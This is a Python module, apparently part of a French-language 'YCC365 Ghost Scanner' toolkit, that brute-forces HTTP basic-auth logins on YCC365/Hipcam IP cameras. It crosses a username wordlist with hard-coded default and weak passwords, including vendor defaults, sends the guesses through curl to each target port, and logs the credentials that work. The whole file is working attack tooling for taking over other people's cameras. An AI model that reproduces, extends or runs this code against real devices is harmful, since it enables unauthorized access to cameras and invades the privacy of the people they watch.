"""
YCC365 Ghost Scanner — Module 4: Username Arsenal
Signé Ghost1o1 — Adapté de OSIN CHAIN UsernameSherlock

Énumère les usernames probables sur les caméras YCC365/Hipcam.
Teste chaque username × password sur les ports HTTP découverts.
Stratégie Sherlock-style: cross-platform, sans rate-limit aggressif.
"""

import socket
import subprocess
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import itertools


@dataclass
class UsernameHit:
    """Résultat d'un username testé."""
    username: str
    password: str
    port: int
    target: str
    success: bool
    http_code: Optional[int] = None
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    confidence: float = 0.0  # 0.0 → 1.0


class UsernameArsenal:
    """
    Module 4 — UsernameSherlock adapté IoT.
    
    Charge une wordlist de usernames + passwords,
    les croise avec les credentials par défaut,
    et testent sur les ports HTTP ouverts.
    """

    WORDLIST_PATH = Path(__file__).parent / "wordlists" / "usernames.txt"

    # Top passwords à croiser (probabilité maximale)
    TOP_PASSWORDS = [
        "", "admin", "12345", "123456", "password", "root", "888888",
        "666666", "abc123", "admin123", "xmhdipc", "ycc365", "lookcam",
        "pass", "default", "test", "guest", "support", "user",
    ]

    def __init__(self, target: str, timeout: float = 3.0):
        self.target = target
        self.timeout = timeout
        self.usernames: List[str] = self._load_usernames()
        self.hits: List[UsernameHit] = []

    def _load_usernames(self) -> List[str]:
        """Charge la wordlist usernames.txt."""
        if not self.WORDLIST_PATH.exists():
            return ["admin", "root", "user", "support"]

        lines = []
        for line in self.WORDLIST_PATH.read_text().splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            lines.append(line)
        return lines

    def _http_basic_auth(self, port: int, user: str, password: str) -> UsernameHit:
        """Test un couple user/password sur un port HTTP."""
        try:
            result = subprocess.run(
                ["curl", "-s", "-m", str(int(self.timeout)),
                 "-o", "/dev/null",
                 "-w", "%{http_code}",
                 "-u", f"{user}:{password}",
                 f"http://{self.target}:{port}/"],
                capture_output=True,
                timeout=self.timeout + 2,
            )
            code = int(result.stdout.decode().strip() or "0")
            success = code in (200, 301, 302)

            return UsernameHit(
                username=user,
                password=password,
                port=port,
                target=self.target,
                success=success,
                http_code=code,
                confidence=0.9 if success else 0.0,
            )
        except (subprocess.TimeoutExpired, ValueError, FileNotFoundError):
            return UsernameHit(
                username=user,
                password=password,
                port=port,
                target=self.target,
                success=False,
                confidence=0.0,
            )

    def run(self, http_ports: List[int]) -> List[UsernameHit]:
        """
        Exécute la sonde username × password sur les ports HTTP.
        
        Args:
            http_ports: Liste de ports où tester (typiquement 80, 443, 8000, 8080)
        """
        if not http_ports:
            return []

        self.hits = []
        tested = set()

        print(f"\n═══ Module 4: Username Arsenal (Sherlock-style) ═══")
        print(f"  [*] {len(self.usernames)} usernames × {len(self.TOP_PASSWORDS)} passwords")
        print(f"  [*] Ports cibles: {http_ports}\n")

        for port in http_ports:
            for user in self.usernames:
                for password in self.TOP_PASSWORDS:
                    key = (port, user, password)
                    if key in tested:
                        continue
                    tested.add(key)

                    hit = self._http_basic_auth(port, user, password)
                    if hit.success:
                        self.hits.append(hit)
                        print(f"  [HIT] {user}:{password} → HTTP {hit.http_code} (port {port})")

        if not self.hits:
            print("  [!] Aucun hit Username Arsenal")
        else:
            print(f"\n  ✅ {len(self.hits)} credentials valides découverts")

        return self.hits

    def stats(self) -> Dict:
        """Statistiques d'exécution."""
        return {
            "module": "Username Arsenal (4)",
            "target": self.target,
            "usernames_loaded": len(self.usernames),
            "passwords_loaded": len(self.TOP_PASSWORDS),
            "tests_run": len(self.usernames) * len(self.TOP_PASSWORDS),
            "hits": len(self.hits),
            "hit_rate": round(
                len(self.hits) / max(1, len(self.usernames) * len(self.TOP_PASSWORDS)) * 100,
                2,
            ),
        }
